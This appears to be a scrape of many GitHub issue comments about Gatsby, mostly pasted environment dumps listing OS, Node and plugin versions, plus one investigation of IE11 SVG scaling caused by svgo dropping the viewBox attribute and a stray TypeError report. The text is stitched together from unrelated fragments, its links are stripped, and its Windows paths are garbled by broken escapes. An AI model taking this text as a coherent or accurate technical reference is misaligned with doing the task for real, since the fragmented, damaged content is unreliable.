system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 12.13.0 - /usr/local/bin/node yarn: 1.19.2 - /usr/local/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 3.6.8 - /users/avanwieringen/anaconda3/bin/python browsers: chrome: 80.0.3987.132 firefox: 73.0 safari: 13.0.1 npmpackages: gatsby: ^2.19.38 => 2.19.38 gatsby-image: ^2.2.43 => 2.2.43 gatsby-plugin-catch-links: ^2.1.27 => 2.1.27 gatsby-plugin-gtag: ^1.0.13 => 1.0.13 gatsby-plugin-manifest: ^2.2.46 => 2.2.46 gatsby-plugin-react-helmet: ^3.1.23 => 3.1.23 gatsby-plugin-sass: ^2.1.30 => 2.1.30 gatsby-plugin-sharp: ^2.4.10 => 2.4.10 gatsby-plugin-sitemap: ^2.2.28 => 2.2.28 gatsby-plugin-styled-components: ^3.1.20 => 3.1.20 gatsby-plugin-typescript: ^2.2.2 => 2.2.2 gatsby-remark-autolink-headers: ^2.1.25 => 2.1.25 gatsby-remark-check-links: ^2.1.0 => 2.1.0 gatsby-remark-copy-linked-files: ^2.1.39 => 2.1.39 gatsby-remark-images: ^3.1.48 => 3.1.48 gatsby-source-filesystem: ^2.1.52 => 2.1.52 gatsby-source-graphql-universal: ^3.1.11 => 3.1.11 gatsby-transformer-json: ^2.2.27 => 2.2.27 gatsby-transformer-remark: ^2.6.57 => 2.6.57 npmglobalpackages: gatsby-cli: 2.8.22
``` system: os: windows 10 10.0.18362 cpu: (8) x64 intel(r) core(tm) i7-6700k cpu @ 4.00ghz binaries: node: 10.18.0 - c:\\program files\ odejs\ ode.exe yarn: 1.16.0 - c:\\program files (x86)\\yarn\\bin\\yarn.cmd npm: 6.13.7 - c:\\program files\ odejs\ pm.cmd languages: python: 3.5.1 - c:\\program files\\python35\\python.exe browsers: edge: 44.18362.449.0 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-mdx-tts: 0.0.2 => 0.0.2 gatsby-plugin-emotion: ^4.1.23 => 4.1.23 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-mdx: ^1.0.75 => 1.0.75 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-polyfill-io: ^1.1.0 => 1.1.0 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sharp: ^2.4.8 => 2.4.8 gatsby-plugin-sitemap: ^2.2.27 => 2.2.27 gatsby-plugin-typescript: ^2.2.0 => 2.2.0 gatsby-remark-images: ^3.1.47 => 3.1.47 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-sharp: ^2.3.17 => 2.3.17 ``` ## some investigation - the internet explorer seems to have issues with svgs that have no `viewbox` property (see:
- `gatsby-plugin-sharp` uses the [svgo]( library to optimize and minimize the generated traced svgs, which by default removes the `viewbox` property.
- here is a issue in the svgo repository mentioning scaling issues by removign the `viewbox` property by default, where i also added a comment mentioning the ie problem: ## possible fix - re-adding the `viewbox` property fixes most cases in ie11 while it seems to not change any behavior in other browsers (tested in chrome v80).
- to prevent svgo to remove it we could change this line of the gatsby-plugin-sharp: #l71 to disable the `removeviewbox` plugin like so:
```javascript
const svgo = new svgo({ multipass: true, floatprecision: 0, plugins: [{ removeviewbox: false }] })
- however, this will only fix cases where the aspect ratio of the `gatsby-image-wrapper` is 1:1
for other cases we also need to set the `preserveaspectratio='none'` to fix it
i did not check if this would have side effects
but it could be done using the svgo [addattributestosvgelement plugin](
## next steps - if you are familiar with svgs it would be great if you could share your thoughts about my solution proposition: do you see any possible side-effects, especially by adding the `preserveapectratio` property?
- i will create a pull request for this (at least for fixing the issue for aspect ratio 1:1 images).
``` system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i5-8259u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.15.3 - ~/.nvm/versions/node/v10.15.3/bin/node yarn: 1.21.1 - ~/.nvm/versions/node/v10.15.3/bin/yarn npm: 6.13.6 - ~/.nvm/versions/node/v10.15.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.132 firefox: 72.0.2 safari: 13.0.5 npmpackages: gatsby: ^2.17.15 => 2.19.35 gatsby-image: ^2.2.33 => 2.2.43 gatsby-plugin-google-analytics: ^2.1.27 => 2.1.37 gatsby-plugin-manifest: ^2.2.28 => 2.2.45 gatsby-plugin-netlify: ^2.1.25 => 2.1.34 gatsby-plugin-offline: ^3.0.21 => 3.0.38 gatsby-plugin-react-helmet: ^3.1.15 => 3.1.23 gatsby-plugin-sharp: ^2.3.0 => 2.4.9 gatsby-plugin-sitemap: ^2.2.21 => 2.2.28 gatsby-plugin-styled-components: ^3.1.13 => 3.1.20 gatsby-plugin-typescript: ^2.1.18 => 2.2.2 gatsby-source-contentful: ^2.1.59 => 2.1.93 gatsby-source-filesystem: ^2.1.37 => 2.1.51 gatsby-transformer-inline-svg: ^0.0.7 => 0.0.7 gatsby-transformer-sharp: ^2.3.5 => 2.3.18
system: os: macos mojave 10.14.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.3 - /bin/zsh binaries: node: 13.10.1 - /usr/local/bin/node yarn: 1.15.2 - /usr/local/bin/yarn npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.132 firefox: 73.0.1 safari: 13.0.5
`gatsby info --clipboard`:
``` system: os: linux 4.15 ubuntu 18.04.4 lts (bionic beaver) cpu: (4) x64 intel(r) pentium(r) cpu n3700 @ 1.60ghz shell: 4.4.20 - /bin/bash binaries: node: 10.19.0 - /usr/bin/node npm: 6.13.4 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 80.0.3987.132 firefox: 74.0b9 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-source-graphql: ^2.1.34 => 2.1.34 gatsby-transformer-sharp: ^2.3.13 => 2.3.13 npmglobalpackages: gatsby-cli: 2.8.29
system: os: linux 4.4 ubuntu 18.04.4 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-9700 cpu @ 3.00ghz shell: 4.4.20 - /bin/bash binaries: node: 13.9.0 - /usr/bin/node yarn: 1.22.0 - /usr/bin/yarn npm: 6.13.7 - /usr/bin/npm languages: python: 2.7.17 - /usr/bin/python npmpackages: gatsby: ^2.15.28 => 2.17.7 gatsby-cli: ^2.7.53 => 2.8.8 gatsby-image: 2.2.23 => 2.2.23 gatsby-plugin-antd: ^2.0.2 => 2.0.2 gatsby-plugin-catch-links: ^2.1.12 => 2.1.15 gatsby-plugin-emotion: ^4.1.9 => 4.1.13 gatsby-plugin-less: ^3.0.9 => 3.0.12 gatsby-plugin-manifest: 2.2.20 => 2.2.20 gatsby-plugin-mdx: ^1.0.46 => 1.0.55 gatsby-plugin-offline: 3.0.11 => 3.0.11 gatsby-plugin-react-helmet: 3.1.10 => 3.1.10 gatsby-plugin-remove-trailing-slashes: ^2.1.9 => 2.1.12 gatsby-plugin-sharp: ^2.2.27 => 2.2.36 gatsby-remark-autolink-headers: 2.1.16 => 2.1.16 gatsby-remark-copy-linked-files: ^2.1.29 => 2.1.29 gatsby-remark-images: ^3.1.25 => 3.1.28 gatsby-remark-mathjax: ^1.0.0 => 1.0.0 gatsby-remark-prismjs: ^3.3.16 => 3.3.20 gatsby-remark-relative-images: ^0.2.3 => 0.2.3 gatsby-source-filesystem: 2.1.28 => 2.1.28 gatsby-transformer-remark: ^2.6.27 => 2.6.32 gatsby-transformer-sharp: 2.2.19 => 2.2.19 npmglobalpackages: gatsby-cli: 2.8.30
system: os: macos 10.15.2 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.16.0 - /usr/local/bin/node yarn: 1.19.0 - /usr/local/bin/yarn npm: 6.11.3 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.132 firefox: 72.0.2 safari: 13.0.4 npmpackages: gatsby: ^2.18.1 => 2.19.19 gatsby-image: ^2.2.33 => 2.2.41 gatsby-plugin-brotli: ^1.3.1 => 1.3.1 gatsby-plugin-manifest: ^2.2.29 => 2.2.41 gatsby-plugin-netlify: ^2.1.33 => 2.1.33 gatsby-plugin-offline: ^3.0.22 => 3.0.35 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-react-helmet: ^3.1.15 => 3.1.22 gatsby-plugin-sass: ^2.1.23 => 2.1.29 gatsby-plugin-sharp: ^2.3.2 => 2.4.5 gatsby-plugin-sitemap: ^2.2.27 => 2.2.27 gatsby-plugin-typescript: ^2.1.27 => 2.1.27 gatsby-source-filesystem: ^2.1.38 => 2.1.48 gatsby-transformer-sharp: ^2.3.5 => 2.3.14 npmglobalpackages: gatsby-cli: 2.10.4
``` system: os: linux 4.4 ubuntu 18.04.1 lts (bionic beaver) cpu: (4) x64 intel(r) core(tm) i5-7200u cpu @ 2.50ghz shell: 4.4.19 - /bin/bash binaries: node: 12.16.1 - /usr/local/bin/node yarn: 1.17.3 - /usr/bin/yarn npm: 6.14.2 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/bin/python npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.43 => 2.2.43 gatsby-plugin-offline: ^3.0.35 => 3.0.35 gatsby-plugin-react-helmet: ^3.1.22 => 3.1.22 gatsby-plugin-sharp: ^2.4.7 => 2.4.7 gatsby-source-filesystem: ^2.1.50 => 2.1.50 gatsby-theme-material-ui: ^1.0.8 => 1.0.8 gatsby-transformer-sharp: ^2.3.17 => 2.3.17 npmglobalpackages: gatsby-cli: 2.9.0
``` system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i7-7y75 cpu @ 1.30ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.0 - ~/.nvm/versions/node/v12.16.0/bin/node yarn: 1.22.0 - ~/.yarn/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.0/bin/npm languages: python: 2.7.16 - /library/frameworks/python.framework/versions/2.7/bin/python browsers: chrome: 80.0.3987.132 safari: 13.0.5 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.42 => 2.2.42 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-mdx: ^1.0.77 => 1.0.77 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-react-helmet-async: ^1.0.15 => 1.0.15 gatsby-plugin-sass: ^2.1.29 => 2.1.29 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-remark-images: ^3.1.44 => 3.1.44 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-sharp: ^2.3.16 => 2.3.16 ```
i\'m getting an error when i run gatsby info --clipboard, that is "gatsby: command not found"
system: os: macos 10.15.2 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.10.1 - ~/.nvm/versions/node/v13.10.1/bin/node yarn: 1.22.1 - /usr/local/bin/yarn npm: 6.13.7 - ~/.nvm/versions/node/v13.10.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.132 firefox: 72.0.2 safari: 13.0.4 npmpackages: gatsby: 2.19.32 => 2.19.32 gatsby-plugin-manifest: 2.2.44 => 2.2.44 gatsby-plugin-no-sourcemaps: 2.1.2 => 2.1.2 gatsby-plugin-offline: 3.0.37 => 3.0.37 gatsby-plugin-purgecss: 4.0.1 => 4.0.1 gatsby-plugin-react-helmet: 3.1.23 => 3.1.23 gatsby-plugin-robots-txt: 1.5.0 => 1.5.0 gatsby-plugin-root-import: 2.0.5 => 2.0.5 gatsby-plugin-sitemap: 2.2.28 => 2.2.28 gatsby-plugin-typescript: 2.2.2 => 2.2.2 gatsby-plugin-webpack-bundle-analyzer: 1.0.5 => 1.0.5 npmglobalpackages: gatsby: 2.19.32
``` system: os: linux 4.4 ubuntu 18.04.1 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-8650u cpu @ 1.90ghz shell: 4.4.19 - /bin/bash binaries: node: 8.10.0 - /usr/bin/node yarn: 1.13.0 - /mnt/c/users/elias/appdata/roaming/npm/yarn npm: 6.14.2 - /usr/local/bin/npm languages: python: 2.7.15 - /usr/bin/python npmpackages: gatsby: ^2.19.30 => 2.19.30 gatsby-image: ^2.2.42 => 2.2.42 gatsby-plugin-google-analytics: ^2.1.36 => 2.1.36 gatsby-plugin-manifest: ^2.2.42 => 2.2.42 gatsby-plugin-react-helmet: ^3.1.22 => 3.1.22 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-plugin-typography: ^2.3.22 => 2.3.22 gatsby-source-filesystem: ^2.1.48 => 2.1.48 gatsby-transformer-sharp: ^2.3.16 => 2.3.16
system: os: windows 10 10.0.17763 cpu: (8) x64 intel(r) core(tm) i7-7700k cpu @ 4.20ghz binaries: node: 12.16.0 - c:\\program files\ odejs\ ode.exe yarn: 1.9.4 - ~\\appdata\ oaming\ pm\\yarn.cmd npm: 6.13.4 - c:\\program files\ odejs\ pm.cmd languages: python: 2.7.3 - c:\\python27\\python.exe browsers: edge: 44.17763.831.0 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-remark: ^2.6.53 => 2.6.53 gatsby-transformer-sharp: ^2.3.13 => 2.3.13
``` system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 12.14.1 - ~/.npm/bin/node yarn: 1.22.0 - ~/.npm/bin/yarn npm: 6.13.6 - ~/.npm/bin/npm languages: python: 2.7.17 - /usr/local/bin/python browsers: firefox: 70.0.1 safari: 13.0.5
system: os: macos mojave 10.14.6 cpu: (12) x64 intel(r) core(tm) i9-8950hk cpu @ 2.90ghz shell: 3.2.57 - /bin/bash binaries: node: 10.18.1 - ~/n/bin/node yarn: 1.19.1 - /usr/local/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.132 firefox: 73.0.1 safari: 13.0.5 npmpackages: gatsby: ^2.19.29 => 2.19.29 gatsby-image: ^2.2.42 => 2.2.42 gatsby-plugin-create-client-paths: ^2.1.22 => 2.1.22 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-manifest: ^2.2.42 => 2.2.42 gatsby-plugin-mdx: ^1.0.74 => 1.0.74 gatsby-plugin-offline: ^3.0.35 => 3.0.35 gatsby-plugin-react-helmet: ^3.1.22 => 3.1.22 gatsby-plugin-scss-typescript: ^4.0.10 => 4.0.10 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-plugin-typescript: ^2.2.0 => 2.2.0 gatsby-source-filesystem: ^2.1.48 => 2.1.48 gatsby-transformer-sharp: ^2.3.16 => 2.3.16 npmglobalpackages: gatsby-cli: 2.10.0
system: os: linux 4.19 debian gnu/linux 10 (buster) 10 (buster) cpu: (12) x64 intel(r) core(tm) i7-8700 cpu @ 3.20ghz shell: 5.0.3 - /bin/bash binaries: node: 10.18.1 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.13.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-plugin-styled-components: 3.1.19 => 3.1.19 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-sharp: ^2.3.13 => 2.3.13
system: os: linux 5.3 ubuntu 18.04.3 lts (bionic beaver) cpu: (8) x64 intel(r) core(tm) i7-7700 cpu @ 3.60ghz shell: 4.4.20 - /bin/bash binaries: node: 10.14.0 - ~/.nvm/versions/node/v10.14.0/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.14.0/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 79.0.3945.117 firefox: 73.0.1 npmpackages: gatsby: ^2.19.28 => 2.19.28 gatsby-image: 2.0.23 => 2.0.23 gatsby-plugin-feed: 2.0.11 => 2.0.11 gatsby-plugin-google-analytics: 2.0.8 => 2.0.8 gatsby-plugin-google-tagmanager: 2.1.23 => 2.1.23 gatsby-plugin-hotjar: 1.0.1 => 1.0.1 gatsby-plugin-hubspot: 1.3.3 => 1.3.3 gatsby-plugin-mailchimp: 5.1.2 => 5.1.2 gatsby-plugin-netlify: 2.0.6 => 2.0.6 gatsby-plugin-netlify-cms: 4.1.35 => 4.1.35 gatsby-plugin-purgecss: 4.0.0 => 4.0.0 gatsby-plugin-react-helmet: 3.0.4 => 3.0.4 gatsby-plugin-robots-txt: 1.3.0 => 1.3.0 gatsby-plugin-sass: 2.0.7 => 2.0.7 gatsby-plugin-sharp: 2.2.9 => 2.2.9 gatsby-plugin-sitemap: 2.0.2 => 2.0.2 gatsby-plugin-tawk: 1.0.0 => 1.0.0 gatsby-remark-copy-linked-files: 2.0.7 => 2.0.7 gatsby-remark-images: 3.1.6 => 3.1.6 gatsby-remark-relative-images: ^0.3.0 => 0.3.0 gatsby-source-filesystem: 2.0.26 => 2.0.26 gatsby-transformer-remark: 2.6.9 => 2.6.9 gatsby-transformer-sharp: 2.2.6 => 2.2.6 npmglobalpackages: gatsby-cli: 2.4.9
``` system: os: macos 10.15.1 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.13.0 - ~/.nvm/versions/node/v12.13.0/bin/node npm: 6.12.0 - ~/.nvm/versions/node/v12.13.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.122 firefox: 73.0.1 safari: 13.0.3 npmpackages: gatsby: ^2.19.27 => 2.19.27 gatsby-image: ^2.2.41 => 2.2.41 gatsby-plugin-manifest: ^2.2.42 => 2.2.42 gatsby-plugin-offline: ^3.0.35 => 3.0.35 gatsby-plugin-react-helmet: ^3.1.22 => 3.1.22 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-plugin-typescript: ^2.1.27 => 2.1.27 gatsby-source-filesystem: ^2.1.48 => 2.1.48 gatsby-transformer-json: ^2.2.26 => 2.2.26 gatsby-transformer-sharp: ^2.3.16 => 2.3.16 npmglobalpackages: gatsby-cli: 2.8.2
gatsby website, the starters page
--- the error message that i get is
typeerror: cannot read property 'tolowercase' of undefined at filtered-starters.js:86
``` which is here #l86 if i'm not mistaken.
system: os: linux 5.3 ubuntu 19.10 (eoan ermine) cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /usr/bin/zsh binaries: node: 13.9.0 - ~/.nvm/versions/node/v13.9.0/bin/node npm: 6.13.7 - ~/.nvm/versions/node/v13.9.0/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: firefox: 73.0.1 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.32 => 3.0.32 gatsby-plugin-postcss: ^2.1.20 => 2.1.20 gatsby-plugin-purgecss: ^4.0.1 => 4.0.1 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-transformer-remark: ^2.6.53 => 2.6.53 gatsby-transformer-sharp: ^2.3.13 => 2.3.13 npmglobalpackages: gatsby-cli: 2.9.0
gatsby info --clipboard system: os: windows 7 6.1.7601 cpu: (4) x64 intel(r) core(tm) i5 cpu m 560 @ 2.67ghz binaries: node: 12.14.1 - d:\\program files\ odejs\ ode.exe npm: 6.13.4 - d:\\program files\ odejs\ pm.cmd languages: python: 2.7.17 - /c/python27/python npmpackages: gatsby: ^2.14.4 => 2.19.18 gatsby-image: ^2.0.22 => 2.2.41 gatsby-plugin-emotion: ^4.1.12 => 4.1.22 gatsby-plugin-feed: ^2.0.8 => 2.3.27 gatsby-plugin-google-analytics: ^2.0.5 => 2.1.35 gatsby-plugin-manifest: ^2.0.5 => 2.2.41 gatsby-plugin-mdx: ^1.0.33 => 1.0.73 gatsby-plugin-offline: ^2.0.5 => 2.2.10 gatsby-plugin-react-helmet: ^3.0.0 => 3.1.22 gatsby-plugin-sass: ^2.1.29 => 2.1.29 gatsby-plugin-sharp: ^2.0.6 => 2.4.5 gatsby-plugin-sitemap: ^2.2.19 => 2.2.27 gatsby-plugin-styled-components: ^3.1.19 => 3.1.19 gatsby-remark-copy-linked-files: ^2.0.5 => 2.1.37 gatsby-remark-images: ^3.1.19 => 3.1.44 gatsby-remark-prismjs: ^3.3.20 => 3.3.31 gatsby-remark-responsive-iframe: ^2.0.5 => 2.2.32 gatsby-remark-smartypants: ^2.0.5 => 2.1.21 gatsby-source-filesystem: ^2.0.2 => 2.1.48 gatsby-transformer-json: ^2.2.26 => 2.2.26 gatsby-transformer-remark: ^2.1.6 => 2.6.52 gatsby-transformer-sharp: ^2.1.3 => 2.3.14
system: os: macos 10.15 cpu: (4) x64 intel(r) core(tm) i7-7660u cpu @ 2.50ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.15.1 - ~/.nvm/versions/node/v10.15.1/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.15.1/bin/npm languages: python: 2.7.16 - /usr/local/bin/python browsers: chrome: 80.0.3987.122 firefox: 72.0.1 safari: 13.0.2 npmpackages: gatsby: ^2.13.50 => 2.19.19 gatsby-image: ^2.2.42 => 2.2.42 gatsby-plugin-google-analytics: ^2.1.34 => 2.1.35 gatsby-plugin-manifest: ^2.2.4 => 2.2.41 gatsby-plugin-mdx: ^1.0.0 => 1.0.73 gatsby-plugin-offline: ^3.0.16 => 3.0.35 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.22 gatsby-plugin-robots-txt: ^1.5.0 => 1.5.0 gatsby-plugin-sass: ^2.1.20 => 2.1.29 gatsby-plugin-sharp: ^2.2.9 => 2.4.5 gatsby-plugin-typescript: ^2.1.15 => 2.1.27 gatsby-source-contentful: ^2.1.62 => 2.1.86 gatsby-source-filesystem: ^2.1.33 => 2.1.48 gatsby-source-graphql: ^2.1.22 => 2.1.33 gatsby-transformer-remark: ^2.6.37 => 2.6.53 gatsby-transformer-sharp: ^2.2.5 => 2.3.14 npmglobalpackages: gatsby-cli: 2.8.3
chrome: version 80.0.3987.122 (official build) (64-bit)
firefox: 73.0.1 (64-bit)
``` system: os: macos 10.15.3 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.8.0 - /usr/local/bin/node yarn: 1.22.0 - /usr/local/bin/yarn npm: 6.14.1 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.122 safari: 13.0.5 npmglobalpackages: gatsby-cli: 2.9.0
``` system: os: linux 5.3 ubuntu 18.04.3 lts (bionic beaver) cpu: (8) x64 amd ryzen 5 2500u with radeon vega mobile gfx shell: 4.4.20 - /bin/bash binaries: node: 13.9.0 - /usr/bin/node yarn: 1.22.0 - ~/bin/yarn npm: 6.13.7 - /usr/bin/npm languages: python: 2.7.15+ - /usr/bin/python browsers: firefox: 73.0.1 npmpackages: gatsby: ^2.19.21 => 2.19.24 gatsby-cli: ^2.9.0 => 2.9.0 gatsby-image: ^2.2.41 => 2.2.42 gatsby-plugin-graphql-codegen: ^2.2.2 => 2.2.3 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.22 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sass: ^2.1.27 => 2.1.29 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-source-filesystem: ^2.1.48 => 2.1.48 gatsby-transformer-json: ^2.2.26 => 2.2.26 gatsby-transformer-sharp: ^2.3.14 => 2.3.16
< commit
rss reader.
``` system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i7-5557u cpu @ 3.10ghz shell: 3.2.57 - /bin/bash binaries: node: 13.8.0 - /opt/local/bin/node npm: 6.13.7 - /opt/local/bin/npm languages: python: 3.7.6 - /opt/local/bin/python browsers: chrome: 80.0.3987.122 firefox: 57.0.4 safari: 13.0.5 npmpackages: gatsby: ^2.19.7 => 2.19.23 gatsby-image: ^2.2.39 => 2.2.41 gatsby-plugin-manifest: ^2.2.39 => 2.2.42 gatsby-plugin-offline: ^3.0.32 => 3.0.35 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.22 gatsby-plugin-sharp: ^2.4.3 => 2.4.5 gatsby-plugin-styled-jsx: ^3.1.19 => 3.1.19 gatsby-plugin-styled-jsx-postcss: ^2.0.2 => 2.0.2 gatsby-source-filesystem: ^2.1.46 => 2.1.48 gatsby-transformer-sharp: ^2.3.13 => 2.3.16 npmglobalpackages: gatsby-cli: 2.9.0 gatsby: 2.0.91
``` system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i7-7820hq cpu @ 2.90ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.13.1 - ~/.nvm/versions/node/v12.13.1/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.14.1 - ~/.nvm/versions/node/v12.13.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 80.0.3987.122 firefox: 72.0.2 safari: 13.0.5 npmpackages: gatsby: ^2.19.0 => 2.19.17 gatsby-image: ^2.2.41 => 2.2.41 gatsby-plugin-sharp: ^2.4.5 => 2.4.5 gatsby-source-filesystem: ^2.1.48 => 2.1.48 gatsby-theme-carbon: ^1.20.0 => 1.20.1 gatsby-transformer-csv: ^2.1.26 => 2.1.26 gatsby-transformer-sharp: ^2.3.16 => 2.3.16 npmglobalpackages: gatsby-cli: 2.9.0 ```
mac os catalina 10.15.3 checked browser.
- safari 13.05
- chrome 80.0.3987.122
<details> ```
system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh
binaries: node: 13.7.0 - /usr/local/bin/node npm: 6.14.1 - /usr/local/bin/npm
languages: python: 2.7.16 - /usr/bin/python
browsers: chrome: 80.0.3987.122 safari: 13.0.5
``` </details>
``` system: os: macos 10.15.3 cpu: (4) x64 intel(r) core(tm) i5-5257u cpu @ 2.70ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.3.0 - /usr/local/bin/node yarn: 1.22.0 - /usr/local/bin/yarn languages: python: 2.7.17 - /usr/local/bin/python browsers: chrome: 80.0.3987.122 firefox: 67.0.2 safari: 13.0.5 npmpackages: gatsby: ^2.19.7 => 2.19.7 gatsby-image: ^2.2.39 => 2.2.39 gatsby-plugin-alias-imports: ^1.0.5 => 1.0.5 gatsby-plugin-firebase: ^0.1.8 => 0.1.8 gatsby-plugin-manifest: ^2.2.39 => 2.2.39 gatsby-plugin-offline: ^3.0.34 => 3.0.34 gatsby-plugin-react-helmet: ^3.1.21 => 3.1.21 gatsby-plugin-sass: ^2.1.28 => 2.1.28 gatsby-plugin-sharp: ^2.4.3 => 2.4.3 gatsby-plugin-stripe: ^1.2.3 => 1.2.3 gatsby-plugin-typescript: ^2.1.27 => 2.1.27 gatsby-plugin-web-font-loader: ^1.0.4 => 1.0.4 gatsby-source-filesystem: ^2.1.46 => 2.1.46 gatsby-source-stripe: ^3.0.5 => 3.0.5 gatsby-transformer-sharp: ^2.3.13 => 2.3.13
